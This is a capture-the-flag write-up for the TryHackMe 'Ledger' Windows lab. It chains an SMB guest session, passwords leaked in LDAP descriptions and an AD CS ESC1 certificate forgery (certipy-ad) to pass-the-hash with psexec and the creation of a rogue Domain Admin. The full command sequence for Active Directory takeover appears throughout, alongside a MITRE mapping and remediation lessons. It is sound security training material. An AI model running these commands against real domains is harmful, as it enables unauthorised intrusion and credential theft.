# Ledger — TryHackMe

<img width="1900" height="379" alt="Screenshot From 2026-05-04 15-31-27" src="https://github.com/user-attachments/assets/41cb64b8-1582-4e25-86f7-2b5d771181b8" />
<br>

![](https://img.shields.io/badge/Platform-TryHackMe-darkred?style=for-the-badge&logo=tryhackme&logoColor=white)
![](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![](https://img.shields.io/badge/Category-Active_Directory%20%7C%20AD_CS-orange?style=for-the-badge)

## Summary


Ledger is a **Hard** Windows machine on TryHackMe centered around Active Directory Certificate Services (AD CS) misconfiguration. Initial reconnaissance reveals a domain controller (`labyrinth.thm.local`) with SMB null authentication enabled and LDAP exposing user credentials in description fields. RDP access as `SUSANNA_MCKNIGHT` getting the user flag (**Flag 1**). BloodHound mapping reveals paths to Domain Admins, but the real prize comes from `certipy-ad`: the `ServerAuth` certificate template is vulnerable to **ESC1** — allowing any authenticated user to request a certificate impersonating the Domain Administrator. The admin's NT hash is extracted from the forged certificate, and `psexec` delivers a SYSTEM shell (**Flag 2**). An alternative exploitation path via LDAP Schannel authentication is documented for cases where Kerberos PKINIT fails.

```
Nmap → SMB Null Auth → LDAP Password Leak → RDP as SUSANNA_MCKNIGHT (Flag 1)
  → BloodHound → AD CS ESC1 → Forge Admin Certificate → NT Hash → psexec (Flag 2)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning  | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| SMB null session & RID brute | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/) | `T1087.002` |
| Passwords in LDAP descriptions | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| RDP login with leaked creds | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) | `T1078.002` |
| BloodHound domain mapping | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Permission Groups Discovery: Domain Groups](https://attack.mitre.org/techniques/T1069/002/) | `T1069.002` |
| AD CS ESC1 certificate forgery | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) | `T1649` |
| NT hash extraction from PFX | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [OS Credential Dumping](https://attack.mitre.org/techniques/T1003/) | `T1003` |
| Pass-the-Hash via psexec | [Lateral Movement](https://attack.mitre.org/tactics/TA0008/) | [Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) | `T1550.002` |
| Domain Admin user creation | [Persistence](https://attack.mitre.org/tactics/TA0003/) | [Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/) | `T1136.002` |
<br>
<img width="1344" height="816" alt="Ledger__THM" src="https://github.com/user-attachments/assets/6cba0555-7a72-4223-a469-f7540be90246" />
<br>

## CVSS Reference

| CVE | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| Passwords in notes | **6.5** (est.) | Medium | LDAP user description fields contain plaintext passwords — unauthenticated readable via guest session CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| [CVE-2024-49019](https://nvd.nist.gov/vuln/detail/CVE-2024-49019) / ESC1 | **7.8** | High | AD CS misconfigured certificate template allows any authenticated user to request client authentication certificates for arbitrary principals, including Domain Administrator |

## Discovery — `T1046` `T1087.002`

### Nmap

Since we're dealing with Active Directory and Windows, the `-Pn` flag is essential to skip host discovery:

```bash
sudo nmap -sC -sV -v 10.114.161.221 -Pn
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA
443/tcp  open  ssl/https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

A full AD stack: DNS, Kerberos, LDAP (4 ports — 389/636 for domain, 3268/3269 for Global Catalog), SMB, RPC, RDP, and IIS. The certificate issuer `thm-LABYRINTH-CA` confirms AD Certificate Services are running — this will matter later.

Add `thm.local` and `labyrinth.thm.local` to `/etc/hosts`. IIS on ports 80/443 shows the default landing page — a dead end confirmed by fuzzing.

### SMB Enumeration — `T1087.002`

```bash
nxc smb 10.114.161.221
```

```
SMB  10.114.161.221  445  LABYRINTH  [*] Windows 10 / Server 2019 Build 17763 x64
     (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

**Null Auth: True** — the server accepts anonymous sessions. Empty credentials are rejected, but the `guest` account works:

```bash
nxc smb 10.114.161.221 -u 'guest' -p '' --rid-brute
```

This dumps a full list of domain users and groups via RID cycling.

### LDAP Enumeration — `T1552.001`

```bash
nxc ldap 10.114.161.221 -u 'guest' -p '' --users
```

<img width="1298" height="632" alt="Ledger_ldap_passwords" src="https://github.com/user-attachments/assets/935ffb0c-843b-4365-bc9e-4f78c2dbbc2a" />
<br>

Two users have **passwords stored in their LDAP description fields**: `IVY_WILLIS` and `SUSANNA_MCKNIGHT`. This is a common misconfiguration in real-world AD environments — administrators use the description field as a "sticky note" for temporary passwords that become permanent.

## Exploitation — `T1078.002`

### Flag 1 — RDP Access

Testing both sets of credentials via RDP (using Remmina):

<img width="1919" height="962" alt="Ledger_rdp_connect" src="https://github.com/user-attachments/assets/a6845d77-7af9-4b2e-be46-74d3027e51ad" />
<br>
`IVY_WILLIS` fails — the password has been changed. `SUSANNA_MCKNIGHT` logs in successfully.
<br>

<img width="1919" height="961" alt="Ledger_user_flag" src="https://github.com/user-attachments/assets/fc5d4520-beb6-40ea-8e13-af979e9e9167" />
<br>

```
THM{Firslt_user_flag!}
```

## Domain Escalation — `T1069.002` `T1649`

### BloodHound Reconnaissance

Map the domain with BloodHound to visualize attack paths:

```bash
bloodhound-ce-python -d thm.local -ns 10.114.161.221 \
    -dc labyrinth.thm.local --zip -c all \
    -u 'SUSANNA_MCKNIGHT' -p '******'
```

<br>
<img width="1919" height="882" alt="Ledger_bloodhound_observ" src="https://github.com/user-attachments/assets/4573fa59-8a1f-4ce4-bbff-752fbd45166b" />
<br>

BloodHound shows a path from our user to Domain Admins through `BEVERLY` and `BRADLEY_ORTIZ`. However, there's a faster route — one that doesn't require pivoting through intermediate users at all.

### AD CS ESC1 — Certificate Template Misconfiguration

Scan for vulnerable certificate templates:

```bash
certipy-ad find -u SUSANNA_MCKNIGHT -p '******' \
    -dc-ip 10.114.161.221 -vulnerable
```
<br>
<img width="1124" height="635" alt="Ledger_vulnerable_ESC1" src="https://github.com/user-attachments/assets/ed845495-5a5b-4a47-a259-93ca373ad5aa" />
<br>

The `ServerAuth` template is vulnerable to **ESC1**. This means any member of `Authenticated Users` can request a client authentication certificate **impersonating any domain principal** — including Domain Administrator. The misconfiguration lies in the template allowing the enrollee to specify an arbitrary Subject Alternative Name (SAN).

### Solution 1 — Certificate Forgery + Pass-the-Hash

Three paths exist from ESC1, all fundamentally the same technique:

1. Forge a certificate as `Administrator` directly
2. Forge as `BRADLEY_ORTIZ` (Domain Admins member)
3. Create a new user and add to Domain Admins

Taking the direct route — request a certificate impersonating the domain Administrator:

```bash
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p '******' \
    -target labyrinth.thm.local \
    -template 'ServerAuth' -ca 'thm-LABYRINTH-CA' \
    -upn Administrator@thm.local
```

This generates `administrator.pfx` — a PKCS#12 file containing the forged certificate and private key. Now extract the NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.114.161.221
```
<br>
<img width="1125" height="640" alt="Ledger_admin&#39;s_hash" src="https://github.com/user-attachments/assets/73a4b0c6-77cb-46cc-a518-938ae164ba69" />
<br>

With the NT hash in hand, we don't need the plaintext password — **Pass-the-Hash** grants direct access:

```bash
impacket-psexec -k -hashes :00000000000000 \
    thm.local/Administrator@labyrinth.thm.local
```
<br>
<img width="1919" height="959" alt="Ledger_root_flag" src="https://github.com/user-attachments/assets/44bdb05e-f9c9-4c15-b248-89d9a7fbbd47" />
<br>

```
THM{root's_flag_is_here}
```

### Solution 2 — Schannel LDAP Shell (PKINIT Fallback)

During testing, the Kerberos PKINIT authentication step sometimes fails:

```
[-] Got error while trying to request TGT:
    Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP
    (KDC has no support for padata type)
```

This error means the DC doesn't have a properly configured certificate for PKINIT authentication. The `.pfx` file is still valid — Kerberos just can't use it. The workaround is **Schannel authentication**: connecting to LDAP over TLS using the certificate directly, bypassing Kerberos entirely:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.114.161.221 -ldap-shell
```

This grants an LDAP shell with Administrator privileges. While it can't read files directly, it can create domain accounts:

```bash
# add_user Den
Attempting to create user in: CN=Users,DC=thm,DC=local
Adding new user with username: Den and password: 40B2lsU/56CP7,6 result: OK

# add_user_to_group Den "Domain Admins"
Adding user: Den to group Domain Admins result: OK
```

Log in via RDP with the newly created Domain Admin account:
<br>
<img width="1919" height="1078" alt="Ledger_root_flag_rdp" src="https://github.com/user-attachments/assets/95b54a59-a96e-4e63-893d-b01337e8940d" />
<br>

## Operational Notes

These gotchas cost significant time during the engagement and are worth documenting:

1. **`certipy-ad` uses Python's `dns.resolver`, not `/etc/hosts`.** If DNS queries fail with "The DNS query name does not exist," it's because `certipy-ad` resolves names through the DNS server in `/etc/resolv.conf` rather than the system's hosts file. Add the target's IP as the **first** `nameserver` entry in `/etc/resolv.conf` — order matters.

2. **`rpcclient` for SID lookups.** When working with AD, Security Identifiers (SIDs) are often needed for advanced attacks. The `rpcclient` utility can resolve usernames to SIDs:

   ```bash
   rpcclient -U 'SUSANNA_MCKNIGHT%PASSWORD' $IP -c "lookupnames Administrator"
   ```

3. **KB5014754 patch may block certificate authentication.** If the DC has this patch installed, `certipy-ad auth` may reject the forged certificate. In that case, specify the target user's SID explicitly during authentication.

## Lessons Learned

1. **LDAP description fields are a credential goldmine.** Administrators routinely store "temporary" passwords in the description field — and forget to remove them. In AD assessments, always query user attributes with `--users` via `nxc ldap` or `ldapsearch` before attempting any brute force.

2. **AD CS ESC1 is a domain takeover in one command.** A single misconfigured certificate template that allows enrollee-specified SANs lets any authenticated user impersonate the Domain Administrator. The fix is straightforward: remove the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag and restrict enrollment permissions.

3. **BloodHound shows paths, but AD CS shows shortcuts.** While BloodHound mapped a multi-hop chain through BEVERLY and BRADLEY, the ESC1 misconfiguration provided a direct, single-step path to Domain Admin — bypassing all intermediate users entirely. Always scan for AD CS vulnerabilities alongside BloodHound enumeration.

4. **Kerberos PKINIT failures don't invalidate a forged certificate.** When `KDC_ERR_PADATA_TYPE_NOSUPP` appears, the certificate itself is still valid — only the authentication mechanism is broken. Falling back to Schannel (LDAP over TLS) uses the same `.pfx` file through a completely different protocol, sidestepping Kerberos entirely.

5. **Pass-the-Hash eliminates the need for password cracking.** Once the NT hash is extracted from the forged certificate, `impacket-psexec` provides direct SYSTEM-level access without ever needing the plaintext password. In AD environments, the hash *is* the credential.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
